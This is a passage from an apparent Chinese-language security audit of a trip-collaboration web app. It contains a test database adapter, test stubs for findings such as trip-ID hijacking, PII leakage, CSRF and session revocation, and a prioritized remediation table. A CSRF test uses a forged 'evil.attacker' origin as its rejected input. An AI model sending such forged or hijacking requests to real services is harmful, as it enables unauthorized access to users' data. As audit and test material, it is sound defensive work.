      let args = [];
      const stmt = db.prepare(sql);
      return {
        bind(...b) { args = b; return this; },
        async first() { return stmt.get(...args) || null; },
        async all() { return { results: stmt.all(...args) }; },
        async run() { return { success: true, meta: stmt.run(...args) }; }
      };
    },
    async batch(stmts) {
      db.exec('BEGIN');
      try {
        const out = [];
        for (const s of stmts) out.push(await s.run());
        db.exec('COMMIT');
        return out;
      } catch (e) { db.exec('ROLLBACK'); throw e; }
    }
  };
}

test('KAIROS-001: POST /api/collab/trips rejects hijacking another owner tripId', async () => {
  const env = { DB: createD1Adapter() };
  // 1) Alice 注册并创建 trip_alice_secret -> 201
  // 2) Bob 注册并提交 POST /api/collab/trips { trip: { id: 'trip_alice_secret' } }
  // 断言: status === 403, 且 Bob 不在 trip_members 中
});

test('KAIROS-002: owner joining own viewer invite retains owner role', async () => {
  // Alice 创建 trip -> 发 viewer 邀请 -> Alice POST /api/collab/join/:token
  // 断言: trip_members.role 仍为 'owner', 后续 POST .../invites 返回 201
});

test('KAIROS-008: public trip hides PII emails/expenses and blocks cross-trip poll voting', async () => {
  // 公开 GET 不含 email 字段与 expenses；POST .../trips/pubId/polls/privPollId/vote 返回 403/404
});

test('KAIROS-009: stale PUT returns 409 Conflict instead of silent overwrite', async () => {
  // baseVersion: 1 对服务端 version: 2 -> 409
});

test('KAIROS-010: collab mutations enforce CSRF origin check', async () => {
  // Origin: https://evil.attacker 或缺失 Origin/Referer 的 cookie POST -> 403
});

test('KAIROS-011: password reset revokes all sessions; rate limit cannot be cleared by self-login; OAuth requires verified_email', async () => {
  // reset-password 后旧 session GET /api/auth/me -> authenticated: false
  // 10 次失败后登录自己账号再猜受害者 -> 仍 429
  // verified_email: false -> 403；DELETE /api/account -> 全表 0 残留行
});
```

---

## 五、修复优先级路线图

| 阶段 | 目标时间窗 | 涉及 Issue | 关键动作 |
| --- | --- | --- | --- |
| **紧急止血 (P0)** | 立即（上线前阻断） | `KAIROS-001`, `KAIROS-002` | `POST /api/collab/trips` 拒绝跨主覆写；`getMemberRole` 优先判 `owner_id` 且禁止降级 `owner`。 |
| **高危加固 (P1-A)** | 第 1 周 | `KAIROS-008`, `KAIROS-009`, `KAIROS-010`, `KAIROS-013` | 公开行程去敏与跨行程投票校验；`PUT` 加 `WHERE version=?` 乐观锁；全路由接入 `verifyCsrf` 与收紧 CORS；全 3 个 CSV 转义 + `s.startTime` HTML 转义。 |
| **身份与隔离重构 (P1-B)** | 第 1–2 周 | `KAIROS-011`, `KAIROS-012`, `KAIROS-014` | 改密清全量会话、OAuth 验 `verified_email` 并清未验证密码、限流按键 `(ip,email)` 迁移持久存储、`DELETE /api/account` 批处理清表；IndexedDB/localStorage 按 `userId` 分区；`/api/img` 禁 SVG/加 `sandbox`、`/api/photos` 强鉴权防穿越、完善全站 CSP。 |
